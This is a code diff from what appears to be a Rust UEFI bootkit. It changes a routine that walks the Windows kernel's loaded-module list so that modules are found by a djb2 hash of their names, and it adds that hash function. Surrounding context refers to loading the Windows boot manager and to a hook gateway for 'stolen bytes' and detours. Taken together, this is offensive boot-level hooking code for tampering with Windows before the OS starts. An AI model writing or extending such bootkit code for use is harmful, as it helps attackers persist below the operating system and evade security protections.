@@ -8,7 +8,7 @@ use uefi::{cstr16, Handle};
 
 use alloc::vec::Vec;
 
-use super::includes::{_KLDR_DATA_TABLE_ENTRY, _LIST_ENTRY};
+use super::includes::{_LIST_ENTRY, _KLDR_DATA_TABLE_ENTRY};
 extern crate alloc;
 
 const JMP_SIZE: usize = 14;
@@ -48,28 +48,50 @@ pub fn load_windows_boot_manager(boot_services: &BootServices) -> uefi::Result<H
     return Ok(new_image);
 }
 
-/// Gets the loaded module by name (needs fixing)
-pub unsafe fn get_loaded_module_by_name(
-    load_order_list_head: *mut _LIST_ENTRY,
-    module_name: &[u8],
-) -> Option<*mut _LIST_ENTRY> {
+pub unsafe fn get_loaded_module_by_hash(load_order_list_head: *mut _LIST_ENTRY, module_hash: u32) -> Option<*mut u8> {
+
     let mut list_entry = (*load_order_list_head).Flink;
 
     while list_entry != load_order_list_head {
-        let module_list = list_entry as *mut _KLDR_DATA_TABLE_ENTRY;
 
-        let dll_buffer_ptr = (*module_list).BaseDllName.Buffer;
-        let dll_length = (*module_list).BaseDllName.Length as usize;
+        let entry = ((list_entry as usize) - core::mem::offset_of!(_KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks)) as *mut _KLDR_DATA_TABLE_ENTRY;
+
+        let dll_buffer_ptr = (*entry).BaseDllName.Buffer;
+        let dll_length = (*entry).BaseDllName.Length as usize;
         let dll_name_slice = from_raw_parts(dll_buffer_ptr as *const u8, dll_length);
+        
+        log::info!("{:#x}", dbj2_hash(dll_name_slice));
 
-        if module_name.eq(dll_name_slice) {
-            return Some(list_entry);
+        if module_hash == dbj2_hash(dll_name_slice) {
+            return Some((*entry).DllBase as _);
         }
+
 
         list_entry = (*list_entry).Flink;
     }
 
     None
+}
+
+/// Generate a unique hash
+pub fn dbj2_hash(buffer: &[u8]) -> u32 {
+    let mut hsh: u32 = 5381;
+    let mut iter: usize = 0;
+    let mut cur: u8;
+
+    while iter < buffer.len() {
+        cur = buffer[iter];
+        if cur == 0 {
+            iter += 1;
+            continue;
+        }
+        if cur >= ('a' as u8) {
+            cur -= 0x20;
+        }
+        hsh = ((hsh << 5).wrapping_add(hsh)) + cur as u32;
+        iter += 1;
+    }
+    return hsh;
 }
 
 /// Creates a gateway to store the stolen bytes and the resume execution flow, then calls the detour function
